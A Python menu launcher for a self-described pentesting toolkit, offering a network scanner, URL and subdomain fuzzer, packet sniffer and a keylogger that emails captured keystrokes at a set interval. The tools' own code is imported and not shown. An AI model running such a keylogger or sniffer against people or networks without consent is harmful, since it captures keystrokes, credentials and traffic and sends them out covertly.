#!/usr/bin/env python3

import netscan 
import sys
import fuzz
import packetsniffer
import os
import pyfiglet
from termcolor import colored
import keylogger

banner = colored(pyfiglet.figlet_format("Pentesting Toolkit"), color="green")
print(banner)
print("\t"*3 + colored("Created by Anish and Mehul",color = "blue"))
print("\n")


print("\t"*4+"[1] Network Scanner")
print("\t"*4+"[2] URL Fuzzer")
print("\t"*4+"[3] Packet Sniffer")
print("\t"*4+"[4] keylogger ")
print("\t"*4+"[5] exit" )
print("\n")		 
print("[-] Enter the choice: ")
user_input = input()
if user_input == '1':
	ip = input("[-] Please specify your target IP or IP range: ")
	print("\n")
	if ip:
		result = netscan.scan(ip)
		netscan.print_result(result)
	else:
		print("[-] Please specify target IP or IP range: ")
elif user_input == '2':
	options = input("[-] Enter 1 for directory scan or 2 for subdomian scan: ")
	if options == '1':
		url = input("[-] Enter the target domain: ")
		wordlist = input("[-] Enter the path of wordlist: ")
		fuzz.directory(url,wordlist)
	else:
		url = input("[-] Enter the target domain: ")
		wordlist = input("[-] Enter the path of wordlist")
		fuzz.subdomain(url,wordlist)

elif user_input == '3':
	interface = input("[-] Please enter the interface you want to sniff on: ")
	if interface:
		print("[-] Packet sniffer started")
		packetsniffer.sniff(interface)

elif user_input == '4':
	email = input("[-] Enter the email address you want to sent report: ")
	password = input("[-] Enter the password for mail: ")
	time = input("[-] Enter time interval for report in seconds: ")
	if email and password:
		mykeylogger = keylogger.Keylogger(int(time),email,password)
		mykeylogger.start()
	else:
		print("[-] Please run again with a valid emai: ")
	
else:
	sys.exit()

